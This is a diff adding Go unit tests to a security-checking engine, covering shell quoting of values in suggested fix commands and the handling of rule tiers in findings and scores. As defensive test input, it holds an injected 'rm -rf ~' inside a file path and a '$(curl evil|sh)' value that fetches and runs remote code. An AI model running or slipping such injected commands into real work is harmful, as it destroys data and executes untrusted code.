@@ -105,3 +105,87 @@ func TestCleanEscapesControlCharacters(t *testing.T) {
 		}
 	}
 }
+
+func TestRenderFixNeutralisesBackticks(t *testing.T) {
+	it := engine.Item{"path": "/tmp/a`rm -rf ~`b", "stop_cmd": "a` · `b", "plain": "/home/u/.aws/credentials"}
+	// Inside a command a machine value is one quoted shell word.
+	if got := engine.RenderFix("Run `ls {path}`", it); got != "Run `ls '/tmp/a'\\''rm -rf ~'\\''b'`" {
+		t.Errorf("machine value in a command: %q", got)
+	}
+	// In prose it only loses its backticks.
+	if got := engine.RenderFix("See {path}.", it); got != "See /tmp/a'rm -rf ~'b." {
+		t.Errorf("machine value in text: %q", got)
+	}
+	if got := engine.RenderFix("`chmod 600 {plain}`", it); got != "`chmod 600 /home/u/.aws/credentials`" {
+		t.Errorf("plain path should stay unquoted: %q", got)
+	}
+	if got := engine.RenderFix("`{stop_cmd}`", it); got != "`a` · `b`" {
+		t.Errorf("trusted markup field changed: %q", got)
+	}
+}
+
+func TestShellQuote(t *testing.T) {
+	cases := map[string]string{
+		"ssh/key.pem":      "ssh/key.pem",
+		"ssh/my key/a.pem": "'ssh/my key/a.pem'",
+		"$(curl evil|sh)":  "'$(curl evil|sh)'",
+		"it's":             `'it'\''s'`,
+		"":                 "''",
+	}
+	for in, want := range cases {
+		if got := engine.ShellQuote(in); got != want {
+			t.Errorf("ShellQuote(%q) = %q, want %q", in, got, want)
+		}
+	}
+}
+
+// Experimental rules run only when asked, carry their tier, and never
+// count in the score; community rules run by default and are labeled.
+func TestTiers(t *testing.T) {
+	mk := func(id, tier string) *engine.Rule {
+		r, err := engine.Parse(id+".yaml", []byte(`id: `+id+`
+severity: high
+tier: `+tier+`
+platforms: [macos]
+source: backup
+match: "!item.configured"
+title: {en: T, vi: T}
+check: {en: C, vi: C}
+explain: {en: E, vi: E}
+fix: {en: F, vi: F}
+tests:
+  - {item: {configured: false}, expect: true}
+  - {item: {configured: true}, expect: false}
+`), sourceNames(), fix.CheckRemedy)
+		if err != nil {
+			t.Fatal(err)
+		}
+		return r
+	}
+	rs := []*engine.Rule{mk("a-stable", "stable"), mk("b-community", "community"), mk("c-experimental", "experimental")}
+	items := map[string][]engine.Item{"backup": {{"configured": false}}}
+	ids := func(fs []engine.Finding) (out []string) {
+		for _, f := range fs {
+			out = append(out, f.RuleID+":"+f.Tier)
+		}
+		return out
+	}
+	if got := strings.Join(ids(engine.Evaluate(rs, items, "macos", "en")), " "); got != "a-stable: b-community:community" {
+		t.Errorf("default = %s", got)
+	}
+	all := engine.EvaluateWith(rs, items, "macos", "en", true)
+	if got := strings.Join(ids(all), " "); got != "a-stable: b-community:community c-experimental:experimental" {
+		t.Errorf("experimental = %s", got)
+	}
+	ran := map[string]bool{"backup": true}
+	if n, _ := engine.CoverageWith(rs, nil, ran, "macos", true); n != 3 {
+		t.Errorf("checked with experimental = %d", n)
+	}
+	if n, _ := engine.Coverage(rs, nil, ran, "macos"); n != 2 {
+		t.Errorf("checked = %d", n)
+	}
+	// Only the experimental rule failing: the score does not move.
+	if s, gain := engine.Score(rs, all[2:], ran, "macos"); s != 100 || gain["c-experimental"] != 0 {
+		t.Errorf("experimental finding scored: %d %v", s, gain)
+	}
+}
